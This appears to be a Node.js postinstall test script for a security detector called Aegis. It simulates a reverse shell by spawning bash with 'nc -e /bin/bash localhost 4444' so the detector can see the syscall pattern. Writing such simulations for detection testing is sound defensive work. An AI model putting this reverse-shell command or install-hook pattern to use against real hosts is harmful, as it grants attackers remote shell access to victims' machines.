/**
 * REVERSE_SHELL Attack Simulator
 * 
 * Opens a bash subprocess, then attempts to run:
 *   nc -e /bin/bash localhost 4444
 * 
 * The listener won't exist — we just need the syscall pattern
 * (execve of bash + nc) for Aegis to detect.
 */

const { spawn } = require('child_process');

console.log('[REVERSE_SHELL] postinstall script executing...');
console.log('[REVERSE_SHELL] Spawning bash subprocess...');

try {
  // Step 1: Spawn bash
  const bash = spawn('bash', ['-c', 'echo "[REVERSE_SHELL] bash spawned"; nc -e /bin/bash localhost 4444'], {
    stdio: ['ignore', 'pipe', 'pipe'],
  });

  bash.stdout.on('data', (data) => {
    console.log(`[REVERSE_SHELL] stdout: ${data.toString().trim()}`);
  });

  bash.stderr.on('data', (data) => {
    console.log(`[REVERSE_SHELL] stderr: ${data.toString().trim()}`);
  });

  bash.on('error', (err) => {
    console.log(`[REVERSE_SHELL] spawn error: ${err.message}`);
  });

  bash.on('close', (code) => {
    console.log(`[REVERSE_SHELL] bash exited with code ${code}`);
  });

  // Timeout kill after 5 seconds (nc will hang trying to connect)
  setTimeout(() => {
    try { bash.kill('SIGTERM'); } catch (e) { /* ignore */ }
    console.log('[REVERSE_SHELL] Timeout — killed hanging process');
  }, 5000);
} catch (err) {
  console.log(`[REVERSE_SHELL] Failed: ${err.message}`);
}
